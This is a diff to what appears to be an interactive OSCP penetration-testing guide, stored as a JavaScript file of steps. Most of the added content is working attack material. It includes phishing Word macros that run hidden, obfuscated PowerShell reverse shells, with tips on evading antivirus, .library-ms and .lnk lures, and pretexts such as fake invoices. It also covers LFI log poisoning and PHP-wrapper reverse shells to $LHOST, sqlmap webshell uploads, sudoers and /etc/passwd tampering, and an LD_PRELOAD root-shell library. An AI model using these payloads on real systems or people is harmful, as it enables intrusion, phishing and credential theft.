@@ -271,7 +271,7 @@ cat live_hosts.txt`,
     cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt
 grep "open" mass_scan.txt
 
-rustscan -a live_hosts.txt -- -sC -sV -oN scans/rustscan.txt
+rustscan -a live_hosts.txt -- -sC -sV -oN rustscan.txt
 
 grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
     warn: null,
@@ -552,8 +552,8 @@ sort -u pivot_hosts.txt > internal_live.txt`,
     phase: "PIVOT",
     title: "Port Scan Through Tunnel",
     body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
-    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN scans/pivot_allports.txt
-nmap -p <PORTS> -sC -sV 172.16.50.5 -oN scans/pivot_targeted.txt
+    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
+nmap -p <PORTS> -sC -sV 172.16.50.5 -oN pivot_targeted.txt
 
 proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
   172.16.50.5 --open -T2
@@ -561,7 +561,7 @@ proxychains curl -sv http://172.16.50.5
 
 for host in $(cat internal_live.txt); do
   nmap -p 80,443,445,22,3389,5985,8080 \\
-    --open $host -oN scans/pivot_$host.txt
+    --open $host -oN pivot_$host.txt
 done`,
     warn: "Never -sS through proxychains. Always -sT.",
     choices: [
@@ -1655,31 +1655,193 @@ payload = padding + eip + nop_sled + shellcode`,
   client_side: {
     phase: "SHELL",
     title: "Client-Side Attacks",
-    body: "HTA, malicious Office macros, VBA. Used when you have a way to get a user to open a file or click a link. Set up listener first.",
-    cmd: `# HTA via msfvenom
+    body: "You have a way to get a user to open something — email, share, phishing page. The full chain is: craft payload → encode to evade AV → embed in document → host → pretext the user → catch shell. Every step matters. AV catches obvious PowerShell strings — the number array + base64 encoding chain is what gets it through. Set up your listener before sending anything.",
+    cmd: `# ══════════════════════════════════════════
+# PATH 1: VBA MACRO IN WORD DOCUMENT
+# ══════════════════════════════════════════
+
+# ── STEP 1: GENERATE POWERSHELL REVERSE SHELL ──
+msfvenom -p windows/x64/shell_reverse_tcp \\
+  LHOST=$LHOST LPORT=$LPORT -f ps1 -o shell.ps1
+# OR write manually (more control over evasion):
+# $c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);...
+
+# ── STEP 2: ENCODE PAYLOAD — NUMBER ARRAY + BASE64 ──
+# This is the key evasion chain: string → char codes → base64
+# In PowerShell on your Kali (or use Python):
+
+python3 << 'EOF'
+import base64
+
+# Your PowerShell payload
+payload = "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
+
+# Step A: Convert to UTF-16LE bytes (PowerShell -EncodedCommand expects this)
+encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
+print(f"Base64 encoded:\n{encoded}\n")
+
+# Step B: Number array (char codes) — VBA-friendly, evades string matching
+nums = ','.join(str(ord(c)) for c in payload)
+print(f"Number array:\n{nums}")
+EOF
+
+# ── STEP 3: VBA MACRO — EMBED IN WORD ────
+# In Word: View > Macros > Create (or Alt+F11 > Insert > Module)
+# Paste this macro:
+
+# Method A — Direct PowerShell (simpler, more detectable):
+# Sub AutoOpen()
+#   Dim cmd As String
+#   cmd = "powershell -nop -w hidden -enc BASE64_HERE"
+#   Shell cmd, vbHide
+# End Sub
+
+# Method B — Number array decode (better AV evasion):
+# Sub AutoOpen()
+#   Dim str As String
+#   Dim arr() As Integer
+#   arr = Array(73,69,88,40,...)   ' your char code array here
+#   Dim i As Integer
+#   For i = 0 To UBound(arr)
+#     str = str & Chr(arr(i))
+#   Next i
+#   Dim wsh As Object
+#   Set wsh = CreateObject("WScript.Shell")
+#   wsh.Run "powershell -nop -w hidden -enc " & str, 0, False
+# End Sub
+
+# Method C — Str split evasion (splits "powershell" string to dodge sig):
+# Sub AutoOpen()
+#   Dim ps As String
+#   ps = "power" & "shell -nop -w hidden -enc BASE64_HERE"
+#   CreateObject("WScript.Shell").Run ps, 0
+# End Sub
+
+# ── STEP 2b: SPLIT LONG PAYLOADS FOR VBA ──
+# VBA has a 1024-character string literal limit per line
+# Long base64 payloads MUST be split across multiple variables and concatenated
+# Use this Python helper to auto-split any payload:
+
+python3 << 'EOF'
+# Paste your base64 payload into the variable below
+payload = "BASE64_PAYLOAD_HERE"
+
+chunk_size = 100   # safe chunk size for VBA string literals
+chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
+
+print("' Paste this into your VBA module:")
+print(f'Dim s1 As String, s2 As String')
+for idx, chunk in enumerate(chunks):
+    var = f's{idx+1}'
+    print(f'{var} = "{chunk}"')
+
+all_vars = ' & '.join([f's{i+1}' for i in range(len(chunks))])
+print(f'Dim payload As String')
+print(f'payload = {all_vars}')
+print(f'CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & payload, 0')
+EOF
+
+# Example output for a split macro (3 chunks):
+# Sub AutoOpen()
+#   Dim s1 As String
+#   Dim s2 As String
+#   Dim s3 As String
+#   s1 = "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAc"
+#   s2 = "wAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQ"
+#   s3 = "AyADMAJwAsADQANAA0ADQAKQA7AA=="
+#   Dim payload As String
+#   payload = s1 & s2 & s3
+#   CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & payload, 0
+# End Sub
+
+# AutoOpen  = fires when document is opened (Word)
+# Document_Open = same thing, different trigger name (use both for compatibility)
+# Sub Document_Open()
+#   AutoOpen
+# End Sub
+
+# ── STEP 4: HOST PAYLOAD + LISTENER ──────
+python3 -m http.server 80   # serves shell.ps1
+nc -nlvp $LPORT             # catches the shell
+
+# ── STEP 5: SAVE AS .DOC (NOT .DOCX) ─────
+# .docx is a zip — macros don't survive unless saved as:
+# .doc  (Word 97-2003) — macros embedded directly
+# .docm (macro-enabled) — modern but triggers more suspicion
+# File > Save As > Word 97-2003 Document (.doc)
+
+# ══════════════════════════════════════════
+# PATH 2: WINDOWS LIBRARY FILE (.library-ms)
+# ══════════════════════════════════════════
+# Two-file attack: .library-ms points to WebDAV share → .lnk runs payload
+# No macro warning — just needs user to open the folder
+
+# Step 1: Set up WebDAV share on Kali (wsgidav)
+pip install wsgidav --break-system-packages
+mkdir /home/kali/webdav
+wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous
+
+# Step 2: Create .lnk shortcut in the webdav folder
+# In PowerShell on Windows:
+# $ws = New-Object -COM WScript.Shell
+# $lnk = $ws.CreateShortcut("automatic_configuration.lnk")
+# $lnk.TargetPath = "powershell"
+# $lnk.Arguments = "-nop -w hidden -enc BASE64_PAYLOAD"
+# $lnk.Save()
+# Transfer the .lnk to /home/kali/webdav/
+
+# Step 3: Create the .library-ms file
+cat > /home/kali/config.library-ms << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <version>6</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-1003</iconReference>
+  <templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>http://LHOST</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+EOF
+# Replace LHOST with your IP
+# Send config.library-ms to target — when they open it,
+# Windows connects to your WebDAV and shows the .lnk
+# When they click the .lnk → shell fires
+
+# ══════════════════════════════════════════
+# PATH 3: HTA (HTML Application)
+# ══════════════════════════════════════════
 msfvenom -p windows/shell_reverse_tcp \\
   LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
 python3 -m http.server 80
-# Deliver: http://$LHOST/shell.hta
+# Deliver link: http://$LHOST/shell.hta
+# User sees "Open / Save" dialog — runs with mshta.exe (often bypasses AV)
 
-# VBA macro (Word/Excel)
-# Insert > Module in VBA editor:
-Sub AutoOpen()
-  Shell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
-End Sub
-
-# PowerShell download cradle
-IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')
-
-# Generate PS reverse shell
-msfvenom -p windows/x64/shell_reverse_tcp \\
-  LHOST=$LHOST LPORT=$LPORT -f ps1 > shell.ps1
-
-nc -nlvp $LPORT`,
-    warn: "Macro execution requires the user to enable macros. Social engineering text in the doc helps.",
+# ══════════════════════════════════════════
+# PRETEXTING — MAKE THEM OPEN IT
+# ══════════════════════════════════════════
+# The document needs a reason to enable macros / click the link.
+# Common pretexts:
+#   "Security update required — enable content to view"
+#   "Document protected — enable editing to read"
+#   "Invoice attached — open to review charges"
+#   "HR policy update — acknowledgment required"
+# Add a blurred/greyed out fake document body so enabling macros
+# appears to "unlock" the content — classic and still effective.
+# Keep the filename believable: Invoice_2024.doc, HR_Policy_Update.doc`,
+    warn: "Save Word docs as .doc not .docx — macros don't survive the zip conversion to .docx unless saved as macro-enabled format. The number array technique (converting payload to char codes then joining) is the key AV evasion — it breaks string-based signature matching. Always test your payload fires locally before sending. Listener must be running before delivery.",
     choices: [
-      { label: "User executed — got shell", next: "shell_upgrade" },
-      { label: "AV killed the payload", next: "amsi_bypass" },
+      { label: "User opened doc — shell caught", next: "shell_upgrade" },
+      { label: "Library file clicked — shell caught", next: "shell_upgrade" },
+      { label: "AV killed the payload — encode harder", next: "amsi_bypass" },
+      { label: "Need to serve file via email/share first", next: "client_side" },
     ],
   },
 
@@ -2605,12 +2767,18 @@ curl -H "Cookie: session=YOURSESSION" \\
   full_portscan: {
     phase: "RECON",
     title: "Full TCP Scan",
-    body: "Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
-    cmd: `# Full TCP (background it)
-nmap -p- --min-rate 5000 -T4 $ip -oN scans/allports.txt
+    body: "cd into your scans directory first — all output files write to the current directory. Run all 65535 ports in the background while you start UDP in parallel. Never skip this — services on high ports get people caught out.",
+    cmd: `# ── SETUP ────────────────────────────────
+mkdir -p ~/scans && cd ~/scans
+# All scan output writes to current dir — stay here for the engagement
+
+# Full TCP (background it)
+nmap -p- --min-rate 5000 -T4 --open --reason $ip -oN allports.txt
+# --open   → only show open ports (filters open|filtered noise)
+# --reason → shows WHY nmap thinks port is open (syn-ack, etc.)
 
 # UDP top 20 (background)
-sudo nmap -sU --top-ports 20 $ip -oN scans/udp.txt &
+sudo nmap -sU --top-ports 20 --reason $ip -oN udp.txt &
 
 # HTTP methods check while you wait
 nmap -p80,443 --script=http-methods $ip \\
@@ -2625,10 +2793,17 @@ nmap -p80,443 --script=http-methods $ip \\
     phase: "RECON",
     title: "Targeted Service Scan",
     body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output.",
-    cmd: `nmap -p <PORTS> -sC -sV -O $ip -oN scans/targeted.txt
+    cmd: `# ── GREP OPEN PORTS FROM ALLPORTS SCAN ───
+# Pull port numbers directly from allports.txt — paste straight into targeted scan
+grep -oP '^[0-9]+(?=/tcp\s+open)' scans/allports.txt | tr '\n' ',' | sed 's/,$//'
+# Output: 22,80,443,8080  ← copy this
 
-# Extract IPs from output
-grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' scans/targeted.txt`,
+# One-liner: run targeted scan immediately after full scan
+ports=$(grep -oP '^[0-9]+(?=/tcp\s+open)' scans/allports.txt | tr '\n' ',' | sed 's/,$//') && \\
+  nmap -p$ports -sC -sV -O --reason $ip -oN targeted.txt
+
+# ── TARGETED SCAN ─────────────────────────
+nmap -p <PORTS> -sC -sV -O --reason $ip -oN targeted.txt`,
     warn: null,
     choices: [
       { label: "Help me read and prioritize this output", next: "analyze_output" },
@@ -2804,11 +2979,11 @@ searchsploit -x [exploit/path]   # read before running
     cmd: `# ── WHEN NMAP OUTPUT LOOKS THIN ──────────
 
 # 1. DID YOU SCAN ALL PORTS?
-nmap -p- --min-rate 5000 $ip -oN scans/allports.txt
+nmap -p- --min-rate 5000 $ip -oN allports.txt
 # Services on high ports (8080, 8443, 8888, 9090, 10000) are common
 
 # 2. UDP — HAVE YOU CHECKED IT?
-sudo nmap -sU --top-ports 100 $ip -oN scans/udp.txt
+sudo nmap -sU --top-ports 100 $ip -oN udp.txt
 # SNMP (161), TFTP (69), DNS (53) often only on UDP
 # SNMP especially — community string "public" = info dump
 
@@ -2954,9 +3129,40 @@ curl -s http://$ip | grep -iE "generator|wp-content|joomla|typo3|framework|versi
 # Location: → redirect target may reveal internal hostname
 # X-Frame-Options missing → signals weak hardening overall
 
+# ── VHOST FUZZING ────────────────────────
+# Many OSCP boxes respond differently on a vhost vs the IP
+# The IP returns a default page; the vhost returns the real app
+# ALWAYS try this when you find a domain name in certs or source
+
+# Get domain name first:
+# - From TLS cert (see below)
+# - From /etc/hosts on a compromised machine
+# - From nmap output (PTR records, hostnames)
+
+# ffuf vhost fuzz (filter by response size baseline):
+# First: curl -s http://$ip/ | wc -c  → note baseline size
+ffuf -u http://$ip -H "Host: FUZZ.domain.com" \\
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+  -fs [baseline_size]
+
+# If you don't know the domain — try common patterns:
+ffuf -u http://$ip -H "Host: FUZZ.$ip" \\
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+  -fs [baseline_size]
+
+# Add discovered vhost to /etc/hosts, then enumerate it fresh:
+echo "$ip dev.domain.com" >> /etc/hosts
+# Now treat dev.domain.com as a completely new web target
+
+# gobuster vhost mode:
+gobuster vhost -u http://$ip \\
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+  --append-domain -r
+
 # ── HTTPS — check cert for hostnames ─────
 echo | openssl s_client -connect $ip:443 2>/dev/null | openssl x509 -noout -text \\
   | grep -E "Subject:|DNS:"
+# Cert SANs often reveal internal hostnames and vhosts — add ALL of them to /etc/hosts
 # Every CN and SAN hostname → add to /etc/hosts → may resolve to different vhost
 
 # ── VIRTUAL HOSTS ─────────────────────────
@@ -3292,18 +3498,32 @@ hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--   # error at N = N-1 columns
+# In URL-encoded POST body — use + for spaces, --+- as comment:
+# username='order+by+5--+-&password=test
+# Increment until error, then back off by 1 = column count
+
 # Or increment NULLs:
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 
-# ── STEP 4: FIND STRING COLUMN ───────────
-' UNION SELECT 'a',NULL,NULL--
-' UNION SELECT NULL,'a',NULL--
+# ── STEP 4: FIND STRING COLUMN (CANARY) ──
+# Inject unique markers — see which one appears in the response
+' UNION SELECT 'A1','B2','C3'--+-
+# B2 visible in response = column 2 is your string column
+# Use that column for all data extraction
+
+# ── COMMENT STYLE REFERENCE ───────────────
+# -- -    (space after double-dash)  → MySQL, PostgreSQL
+# --+-    (URL-encoded space)        → MySQL in POST bodies  ← USE THIS IN FORMS
+# #       (hash)                     → MySQL
+# /**/    (inline comment)           → most engines
 
 # ── SQLMAP QUICK START ───────────────────
 sqlmap -u "http://$ip/page?id=1" --batch --level=2 --risk=2
-sqlmap -u "http://$ip/login" --data="user=a&pass=b" --batch`,
-    warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths requiring different techniques.",
+sqlmap -u "http://$ip/login" --data="user=a&pass=b" --batch
+# Target a specific parameter (when sqlmap guesses wrong):
+sqlmap -u "http://$ip/page?id=1&cat=2" -p id --batch`,
+    warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths. In URL-encoded POST bodies, use + for spaces and --+- as the comment terminator — plain -- often fails.",
     choices: [
       { label: "Error visible in response — error-based", next: "sqli_error" },
       { label: "Column count found — UNION injection", next: "sqli_union" },
@@ -3480,6 +3700,9 @@ curl -s -i -X POST "http://TARGET/login" --data "user=admin'&pass=x" | grep -iE 
 # Boolean-only technique flag:
 sqlmap -u "http://$ip/page?id=1" --technique=B --batch --level=3 --current-db
 
+# Target a specific parameter (-p) when sqlmap picks the wrong one:
+sqlmap -u "http://$ip/page?id=1&cat=2" -p id --technique=B --batch --dbs
+
 sqlmap -u "http://$ip/page?id=1" --technique=B --batch \
   -D [dbname] -T users -C username,password --dump
 
@@ -3487,12 +3710,22 @@ sqlmap -u "http://$ip/page?id=1" --technique=B --batch \
 sqlmap -u "http://$ip/login" --data="user=a&pass=b" \
   --technique=B --batch --level=3 --dbs
 
+# ── ESCALATE WHEN LEVEL=3 FINDS NOTHING ──
+# Level 2-3 misses some injection points — escalate:
+sqlmap -u "http://$ip/page?id=1" --batch --level=5 --risk=3 --dbs
+# --level=5: tests headers (User-Agent, Referer, Cookie) as injection points
+# --risk=3:  includes UPDATE/INSERT payloads (heavier, use carefully)
+# Combined: catches injections in Cookie, User-Agent, X-Forwarded-For
+
+# Cookie injection (inject into session cookie):
+sqlmap -u "http://$ip/page" --cookie="id=1*" --batch --level=3
+
 # ── BURP INTRUDER (manual extraction) ────
 # Payload template:
 # ' AND substring((SELECT password FROM users LIMIT 0,1),§POS§,1)='§CHAR§'--
 # Cluster bomb: POS = 1..32, CHAR = a-z,0-9,special
 # True = different response Content-Length`,
-    warn: "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. Add --threads=5 to speed extraction.",
+    warn: "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. If level=3 finds nothing, escalate to --level=5 --risk=3 which tests Cookie and header injection points that lower levels skip. Use -p to force sqlmap onto the correct parameter when it guesses wrong.",
     choices: [
       { label: "sqlmap extracting — got credentials", next: "creds_found" },
       { label: "Behavior too inconsistent — try time-based", next: "sqli_time" },
@@ -3605,22 +3838,30 @@ sqlmap -u "http://$ip/page?id=1" \
     phase: "WEB",
     title: "SQLi — sqlmap Full Escalation",
     body: "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
-    cmd: `# ── STAGE 1: CONFIRM + FINGERPRINT ──────
+    cmd: `# ── STEP 1: CAPTURE REQUEST IN BURP → req.txt ──
+# In Burp: right-click request → "Save item" → req.txt
+# This is the cleanest approach — handles cookies, POST, headers automatically
+sqlmap -r req.txt --batch --dbs
+sqlmap -r req.txt --batch --level=3 --risk=2 --dbs   # escalated
+sqlmap -r req.txt --batch --random-agent --dbs        # rotate User-Agent
+
+# Mark the injection point manually in req.txt with *:
+# username=admin*&password=test   ← sqlmap injects at *
+
+# ── STEP 2: URL-BASED (when no Burp) ─────
 sqlmap -u "http://$ip/page?id=1" --batch --dbs
+# Target specific param (-p):
+sqlmap -u "http://$ip/page?id=1&cat=2" -p id --batch --dbs
+# HTTPS:
+sqlmap -u "https://$ip/page?id=1" --batch --force-ssl --dbs
 
-# ── STAGE 2: DUMP CREDENTIALS ────────────
-sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] --tables
-sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users --columns
-sqlmap -u "http://$ip/page?id=1" --batch -D [dbname] -T users \
-  -C username,password --dump
-
-# ── POST / REQUEST FILE ──────────────────
-# Capture in Burp → save to req.txt
-sqlmap -r req.txt --batch --level=3 --risk=2 --dbs
+# ── STEP 3: DUMP CREDENTIALS ─────────────
+sqlmap -r req.txt --batch -D [dbname] --tables
+sqlmap -r req.txt --batch -D [dbname] -T users --columns
+sqlmap -r req.txt --batch -D [dbname] -T users -C username,password --dump
 
 # ── COOKIE INJECTION ─────────────────────
-sqlmap -u "http://$ip/page" \
-  --cookie="id=1*" --batch --level=3
+sqlmap -u "http://$ip/page" --cookie="id=1*" --batch --level=3
 
 # ── AUTHENTICATED SESSION ─────────────────
 sqlmap -u "http://$ip/page?id=1" \
@@ -3628,22 +3869,22 @@ sqlmap -u "http://$ip/page?id=1" \
 
 # ── OS SHELL ─────────────────────────────
 # Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell
-sqlmap -u "http://$ip/page?id=1" --os-shell
+sqlmap -r req.txt --os-shell
+# If webroot unknown — find it first:
+sqlmap -r req.txt --file-read="/etc/apache2/sites-enabled/000-default.conf"
+sqlmap -r req.txt --file-read="/etc/nginx/sites-enabled/default"
 
 # ── FILE READ ────────────────────────────
-sqlmap -u "http://$ip/page?id=1" --file-read="/etc/passwd"
-sqlmap -u "http://$ip/page?id=1" --file-read="/var/www/html/config.php"
+sqlmap -r req.txt --file-read="/etc/passwd"
+sqlmap -r req.txt --file-read="/var/www/html/config.php"
 
 # ── FILE WRITE (webshell) ─────────────────
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
-sqlmap -u "http://$ip/page?id=1" \
-  --file-write="/tmp/shell.php" \
-  --file-dest="/var/www/html/shell.php"
+sqlmap -r req.txt --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
 
 # ── MSSQL STACKED QUERIES → SHELL ────────
-sqlmap -u "http://$ip/page?id=1" \
-  --technique=S --os-shell`,
-    warn: "--os-shell can fail silently. If it opens but commands don't execute: wrong webroot path. Use --file-read to probe config files and confirm the correct path first.",
+sqlmap -r req.txt --technique=S --os-shell`,
+    warn: "Always use -r req.txt from a Burp capture — it handles authentication cookies, POST bodies, and custom headers automatically without manual reconstruction. --os-shell fails silently with wrong webroot path — file-read the server config first to find the exact path. Add --random-agent to bypass WAFs that block sqlmap's default User-Agent string.",
     choices: [
       { label: "Dumped credentials", next: "creds_found" },
       { label: "os-shell working — upgrade to reverse shell", next: "sqli_shell" },
@@ -3755,6 +3996,18 @@ mv real_image.png shell.php.png
 # JPEG magic bytes (hex): FF D8 FF
 python3 -c "open('shell.php','wb').write(b'\xff\xd8\xff' + b'<?php system(\$_REQUEST["cmd"]); ?>')"
 
+# ── STEP 4b: BYPASS TIER — .HTACCESS UPLOAD ──
+# If extension blacklisting is in place but .htaccess uploads are allowed:
+# Upload a .htaccess file that makes .jpg files execute as PHP:
+echo "AddType application/x-httpd-php .jpg" > .htaccess
+# Upload .htaccess to the upload directory
+# Then upload shell.jpg (your PHP shell with .jpg extension)
+# Browse to /uploads/shell.jpg?cmd=id — executes as PHP
+
+# Also works with other extensions:
+echo "AddType application/x-httpd-php .png" > .htaccess
+echo "AddType application/x-httpd-php .gif" > .htaccess
+
 # ── STEP 5: BYPASS TIER — FILENAME TRICKS ─
 # Path traversal in filename (may write outside intended dir)
 ../shell.php
@@ -3831,6 +4084,43 @@ C:/Windows/repair/SAM
 ..\\..\\..\\Windows\\win.ini
 ....//....//....//Windows/win.ini
 %5c..%5c..%5cWindows%5cwin.ini
+
+# ── PHP WRAPPERS → RCE ───────────────────
+# php://filter — read source code base64-encoded (no RCE but gets source)
+http://$ip/page?file=php://filter/convert.base64-encode/resource=index.php
+# Decode: echo "BASE64" | base64 -d
+
+# php://input — POST body executed as PHP (needs allow_url_include=On)
+# Send this as the POST body with Content-Type: application/x-www-form-urlencoded:
+curl -s -X POST "http://$ip/page?file=php://input" \
+  -d "<?php system('id'); ?>"
+
+# expect:// — direct command execution (needs expect extension)
+http://$ip/page?file=expect://id
+http://$ip/page?file=expect://bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
+
+# data:// — inline PHP execution (needs allow_url_include=On)
+http://$ip/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+# Decoded: <?php system($_GET['cmd']); ?>
+
+# ── LOG POISONING → RCE ──────────────────
+# Step 1: Poison the log by injecting PHP into a logged field
+# Via User-Agent (Apache/Nginx access.log):
+curl -s -A "<?php system(\$_GET['cmd']); ?>" http://$ip/
+# Via SSH username (auth.log — works even on failed logins!):
+ssh '<?php system($_GET["cmd"]); ?>'@$ip
+# Via SMTP (mail.log):
+nc $ip 25
+EHLO test
+MAIL FROM: <?php system($_GET['cmd']); ?>
+
+# Step 2: Include the poisoned log via LFI
+http://$ip/page?file=/var/log/apache2/access.log&cmd=id
+http://$ip/page?file=/var/log/auth.log&cmd=id
+http://$ip/page?file=/var/log/nginx/access.log&cmd=id
+
+# Step 3: Upgrade to reverse shell
+http://$ip/page?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'
 
 # ── FFUF LFI WORDLIST FUZZING ─────────────
 # Linux
@@ -4398,26 +4688,49 @@ hash-identifier <hash>
 hashid <hash>
 # Or: https://hashes.com/en/tools/hash_identifier
 
-# Hashcat modules:
+# ── HASH MODULE REFERENCE ─────────────────
 # MD5           = -m 0
 # SHA1          = -m 100
-# NTLM          = -m 1000
-# NetNTLMv2     = -m 5600
-# sha512crypt   = -m 1800   (Linux $6$)
-# bcrypt        = -m 3200
-# Kerberoast    = -m 13100
-# AS-REP        = -m 18200
+# SHA256        = -m 1400
+# NTLM          = -m 1000      ← Windows local accounts
+# NetNTLMv1     = -m 5500
+# NetNTLMv2     = -m 5600      ← Responder captures
+# sha512crypt   = -m 1800      ← Linux $6$
+# sha256crypt   = -m 7400      ← Linux $5$
+# md5crypt      = -m 500       ← Linux $1$
+# bcrypt        = -m 3200      ← Linux $2y$
+# Kerberoast    = -m 13100     ← $krb5tgs$23$ (RC4)
+# Kerberoast    = -m 19700     ← $krb5tgs$18$ (AES-256)
+# AS-REP        = -m 18200     ← $krb5asrep$
+# SSH key       = -m 22921
 
+# ── SECRETSDUMP OUTPUT FORMAT ─────────────
+# impacket-secretsdump produces: username:RID:LM:NTLM:::
+# Extract just NTLM hashes for hashcat:
+grep -oP ':[0-9a-f]{32}:::' secretsdump.txt | tr -d ':' > ntlm_only.txt
+# Or keep username:hash format and use --username:
+hashcat -m 1000 secretsdump.txt /usr/share/wordlists/rockyou.txt --username
+# --username tells hashcat to ignore the username prefix in each line
+
+# ── CRACK ────────────────────────────────
 hashcat -m <module> hash.txt /usr/share/wordlists/rockyou.txt
-hashcat -m <module> hash.txt rockyou.txt \\
-  -r /usr/share/hashcat/rules/best64.rule
-hashcat -m <module> hash.txt rockyou.txt \\
-  -r /usr/share/hashcat/rules/d3ad0ne.rule
+hashcat -m <module> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m <module> hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
 
-# John
+# Rule stacking (combine two rule files):
+hashcat -m 1000 hash.txt rockyou.txt \\
+  -r /usr/share/hashcat/rules/best64.rule \\
+  -r /usr/share/hashcat/rules/toggles1.rule
+
+# Show cracked results:
+hashcat -m 1000 hash.txt --show
+hashcat -m 1000 hash.txt --show --username   # if file has user:hash format
+
+# ── JOHN FALLBACK ─────────────────────────
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-john hash.txt --format=NT --wordlist=rockyou.txt`,
-    warn: null,
+john hash.txt --format=NT --wordlist=rockyou.txt
+john --list=formats | grep -i ntlm   # find correct format name`,
+    warn: "Always use --username when cracking secretsdump output — without it, hashcat tries to crack the username:RID prefix and fails silently. secretsdump NTLM hashes are the 4th colon-separated field: administrator:500:LMHASH:NTLMHASH::: — take only the NTLM portion. Machine account hashes (ending in $) almost never crack — skip them.",
     choices: [
       { label: "Cracked — got plaintext password", next: "creds_found" },
       { label: "rockyou failed — try larger list or more rules", next: "hashcrack" },
@@ -4831,6 +5144,11 @@ chmod +x /tmp/pspy && /tmp/pspy`,
     title: "Sudo Rights",
     body: "sudo -l is always the first manual check. Anything here goes straight to GTFOBins. LD_PRELOAD and env_keep abuse are often overlooked.",
     cmd: `sudo -l
+# Read the output carefully:
+# (root) NOPASSWD: /usr/bin/vim   → no password needed, run as root
+# (ALL) ALL                        → full root access
+# env_keep+=LD_PRELOAD             → LD_PRELOAD abuse (see below)
+# env_keep+=LD_LIBRARY_PATH        → LD_LIBRARY_PATH abuse
 
 # GTFOBins one-liners for common findings:
 # sudo vim      → :!/bin/bash
@@ -4840,12 +5158,34 @@ chmod +x /tmp/pspy && /tmp/pspy`,
 # sudo less     → sudo less /etc/passwd → !/bin/bash
 # sudo awk      → sudo awk 'BEGIN {system("/bin/bash")}'
 # sudo env      → sudo env /bin/sh
-# sudo tee      → echo "root2:$(openssl passwd -1 pass):0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
-# sudo cp       → copy /etc/sudoers, edit, copy back
+# sudo tee      → echo "root2:HASH:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
+# sudo cp       → cp /etc/sudoers /tmp/s; echo "user ALL=(ALL) NOPASSWD:ALL" >> /tmp/s; sudo cp /tmp/s /etc/sudoers
 
-# LD_PRELOAD abuse (if env_keep=LD_PRELOAD)
-# Write shared lib that spawns shell, sudo <anything>`,
-    warn: null,
+# ── LD_PRELOAD ABUSE ──────────────────────
+# Requires: env_keep+=LD_PRELOAD in sudo -l output
+# Step 1: Write a shared library that spawns a shell
+cat > /tmp/shell.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+EOF
